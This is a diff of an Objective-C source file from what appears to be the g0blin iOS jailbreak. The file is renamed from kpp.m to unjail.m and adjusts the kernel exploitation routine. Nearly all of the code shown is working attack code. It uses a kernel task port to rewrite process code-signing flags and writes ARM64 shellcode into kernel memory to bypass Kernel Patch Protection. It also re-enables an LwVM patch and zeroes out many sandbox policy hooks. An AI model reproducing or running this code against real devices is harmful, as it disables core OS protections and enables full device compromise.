@@ -1,5 +1,5 @@
 //
-//  kpp.m
+//  unjail.m
 //  g0blin
 //
 //  This is qwertyoruiop's KPP bypass, along with kernel patches.
@@ -9,7 +9,7 @@
 //  Copyright © 2017 qwertyoruiop. All rights reserved.
 //
 
-#import "kpp.h"
+#import "unjail.h"
 #import "offsets.h"
 #import "kernel.h"
 #import "sbops.h"
@@ -23,7 +23,7 @@
 extern task_t tfp0; // for pte_stuff.h
 
 
-kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_t self_cred, uint64_t self_proc) {
+kern_return_t do_unjail(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_t self_cred, uint64_t self_proc) {
     kern_return_t ret = KERN_FAILURE;
     
     tfp0 = tfpzero;
@@ -48,20 +48,19 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     uint64_t proc = ReadAnywhere64(allproc);
     while(proc) {
         uint32_t pid = ReadAnywhere32(proc + offset_p_pid);
-        
         char pname[40] = {0};
         kread(proc + offset_p_comm, pname, 20);
         
-//        if (strstr(pname, "containermanager")) {
-//            printf("[INFO]: found containermanagerd, giving it kern creds \n");
-//            WriteAnywhere64(proc + offset_p_cred, kern_cred);
-//        }
+        //TEST
+        //if (strstr(pname, "containermanager")) {
+        //    printf("[INFO]: found containermanagerd, giving it kern creds \n");
+        //    WriteAnywhere64(proc + offset_p_cred, kern_cred);
+        //}
         
         if (pid > 0) {
             uint32_t csflags = ReadAnywhere32(proc + offset_p_csflags);
-//            csflags |= CS_VALID|CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
-//            csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
-            csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
+            //csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
+            csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW|CS_ADHOC|CS_VALID;
             csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
             WriteAnywhere32(proc + offset_p_csflags, csflags);
             printf("[INFO]: entitled proc: (%d) %s \n", pid, pname);
@@ -80,6 +79,7 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
 
     gPhysBase = ReadAnywhere64(gStoreBase);
     printf("[INFO]: gPhysBase = %llx \n", gPhysBase);
+    
     gVirtBase = ReadAnywhere64(gStoreBase+8);
     printf("[INFO]: gVirtBase = %llx \n", gVirtBase);
     
@@ -97,11 +97,13 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     
     uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
     printf("[INFO]: cpu_list = %llx \n", cpu_list);
+    
     uint64_t cpu = ReadAnywhere64(cpu_list);
     printf("[INFO]: cpu = %llx \n", cpu);
     
     uint64_t pmap_store = find_kernel_pmap();
     printf("[INFO]: pmap = %llx \n", pmap_store);
+    
     level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
     printf("[INFO]: level1_table = %llx \n", level1_table);
     
@@ -184,7 +186,6 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
         cpu = ReadAnywhere64(cpu_list);
     }
     
-    
     uint64_t shc = physalloc(0x4000);
     
     uint64_t regi = find_register_value(idlesleep_handler+12, 30);
@@ -238,34 +239,35 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     shc-=0x100;
     
     // amfiret shellcode
-    {
-        int n = 0;
-        
-//        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
-//        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str    w8, [x23]
-//        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov    x0, xzr
-//        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
-//        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
-//        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
-//        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
-//        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
-//        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80 (0x50)
-//        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
-//        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
-        
-        // test (10.3.2)
-        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr      w8, 0x28
-        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str      w8, [x23]
-        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov      x0, xzr
-        WriteAnywhere32(shc+0x200+n, 0xA9477BFD); n+=4; // ldp      x29, x30, [sp, #112]
-        WriteAnywhere32(shc+0x200+n, 0xA9464FF4); n+=4; // ldp      x20, x19, [sp, #96]
-        WriteAnywhere32(shc+0x200+n, 0xA94557F6); n+=4; // ldp      x22, x21, [sp, #80]
-        WriteAnywhere32(shc+0x200+n, 0xA9445FF8); n+=4; // ldp      x24, x23, [sp, #64]
-        WriteAnywhere32(shc+0x200+n, 0xA94367FA); n+=4; // ldp      x26, x25, [sp, #48]
-        WriteAnywhere32(shc+0x200+n, 0x910203FF); n+=4; // add      sp, sp, #128
-        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
-        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b   v15, { v0, v1, v2 }, v0
-    }
+    int n = 0;
+    
+//    WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
+//    WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str    w8, [x23]
+//    WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov    x0, xzr
+//
+//    WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
+//    WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
+//    WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
+//    WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
+//    WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
+//    WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80 (0x50)
+//    WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
+//    WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
+    
+    // 10.3
+    WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr      w8, 0x28
+    WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str      w8, [x23]
+    WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov      x0, xzr
+    
+    WriteAnywhere32(shc+0x200+n, 0xA9477BFD); n+=4; // ldp      x29, x30, [sp, #112]
+    WriteAnywhere32(shc+0x200+n, 0xA9464FF4); n+=4; // ldp      x20, x19, [sp, #96]
+    WriteAnywhere32(shc+0x200+n, 0xA94557F6); n+=4; // ldp      x22, x21, [sp, #80]
+    WriteAnywhere32(shc+0x200+n, 0xA9445FF8); n+=4; // ldp      x24, x23, [sp, #64]
+    WriteAnywhere32(shc+0x200+n, 0xA94367FA); n+=4; // ldp      x26, x25, [sp, #48]
+    WriteAnywhere32(shc+0x200+n, 0x910203FF); n+=4; // add      sp, sp, #128
+    WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
+    WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b   v15, { v0, v1, v2 }, v0
+    
     
     mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
     printf("[INFO]: shc: %llx \n", shc);
@@ -382,12 +384,12 @@ remappage[remapcnt++] = (x & (~PMK));\
     
 #pragma mark - LwVM
     
-//    uint64_t lwvm_write = find_lwvm_mapio_patch();
-//    printf("[INFO]: lwvm_write = %llx \n", lwvm_write);
-//    uint64_t lwvm_value = find_lwvm_mapio_newj();
-//    printf("[INFO]: lwvm_value = %llx \n", lwvm_value);
-//    RemapPage(lwvm_write);
-//    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
+    uint64_t lwvm_write = find_lwvm_mapio_patch();
+    printf("[INFO]: lwvm_write = %llx \n", lwvm_write);
+    uint64_t lwvm_value = find_lwvm_mapio_newj();
+    printf("[INFO]: lwvm_value = %llx \n", lwvm_value);
+    RemapPage(lwvm_write);
+    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
     
     
 #pragma mark - MarijuanARM
@@ -424,7 +426,6 @@ remappage[remapcnt++] = (x & (~PMK));\
 	
     RemapPage(memcmp_got);
     WriteAnywhere64(NewPointer(memcmp_got), ret1);
-	
     
     uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
     printf("[INFO]: fref at %llx\n", fref);
@@ -447,7 +448,6 @@ remappage[remapcnt++] = (x & (~PMK));\
         
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
     }
-    
     
     /* first str */
     while (1) {
@@ -494,6 +494,7 @@ remappage[remapcnt++] = (x & (~PMK));\
             RemapPage(((sbops + i*(PSZ)) & (~PMK)));
         }
         
+        // from yalu
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
@@ -521,14 +522,11 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
-        
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
         
-        // test: from h3lix
-        //WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
-        //WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
-        
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_debug)), 0);
+        // from h3lix
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
     }
     
     
@@ -537,7 +535,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     // thx tihmstar
     {
         uint64_t off = find_sandbox_label_update();
-        LOG("found sandbox_label_update patch location -> 0x%llx", off);
+        LOG("patching check_label_update at: 0x%llx", off);
         RemapPage(off);
         WriteAnywhere32(NewPointer(off), INSN_NOP);
     }
@@ -558,7 +556,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere32(remap + 4, 0xd61f0020); // br x1
         WriteAnywhere64(remap + 8, shc + 0x200); /* amfi shellcode */
     }
-    
+
     
 #pragma mark -
     
